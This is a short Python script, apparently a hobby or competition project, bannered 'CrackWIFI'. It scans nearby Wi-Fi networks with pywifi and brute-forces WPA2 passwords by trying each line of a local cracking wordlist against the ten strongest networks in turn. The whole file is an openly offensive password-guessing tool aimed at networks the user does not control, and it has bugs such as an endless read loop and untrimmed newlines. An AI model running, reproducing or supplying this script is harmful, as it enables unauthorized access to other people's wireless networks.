import pywifi
from pywifi import const  # 引用一些定义
import time


def getwifi():
    wifi = pywifi.PyWiFi()  # 抓取网卡接口
    ifaces = wifi.interfaces()[0]  # 获取网卡
    ifaces.scan()
    bessis = ifaces.scan_results()
    list = []
    for data in bessis:
        list.append((data.ssid, data.signal))
    return len(list), sorted(list, key=lambda st: st[1], reverse=True)


def getsignal():
    while True:
        n, data = getwifi()
        time.sleep(1)
        if n is not 0:
            return data[0:10]


def ssidnamelist():
    ssidlist = getsignal()
    namelist = []
    for item in ssidlist:
        namelist.append(item[0])
    return namelist


def testwifi(ssidname, password):
    wifi = pywifi.PyWiFi()  # 抓取网卡接口
    ifaces = wifi.interfaces()[0]  # 获取网卡
    ifaces.disconnect()  # 断开无限网卡连接

    profile = pywifi.Profile()  # 创建wifi连接文件
    profile.ssid = ssidname  # 定义wifissid
    profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
    profile.cipher = const.CIPHER_TYPE_CCMP  ##加密单元
    profile.key = password  # wifi密码

    ifaces.remove_all_network_profiles()  # 删除其他所有配置文件
    tmp_profile = ifaces.add_network_profile(profile)  # 加载配置文件

    ifaces.connect(tmp_profile)  # 连接wifi
    time.sleep(5)  # 5秒内能否连接上
    if ifaces.status() == const.IFACE_CONNECTED:
        print("[-]WiFi connection success!")
    else:
        print("[-]WiFi connection failure!")

        ifaces.disconnect()  # 断开连接
        time.sleep(1)

    return True


def main():
    print("  ____                _   __        _____ _____ ___ ")
    print(" / ___|_ __ __ _  ___| | _\ \      / /_ _|  ___|_ _|")
    print("| |   | '__/ _` |/ __| |/ /\ \ /\ / / | || |_   | | ")
    print("| |___| | | (_| | (__|   <  \ V  V /  | ||  _|  | | ")
    print(" \____|_|  \__,_|\___|_|\_\  \_/\_/  |___|_|   |___|")
    path = r"F:\文档\项目比赛\WIFI\wpa2pjzd_115964\破解字典\wordlist\wordlist.txt"
    files = open(path, 'r')
    while True:
        f = files.readline()
        for ssidname in ssidnamelist():
            ret = testwifi(ssidname, f)
            print('Current WIFIname:', ssidname)
            print('Current password:', f)
    files.close()


if __name__ == '__main__':
    main()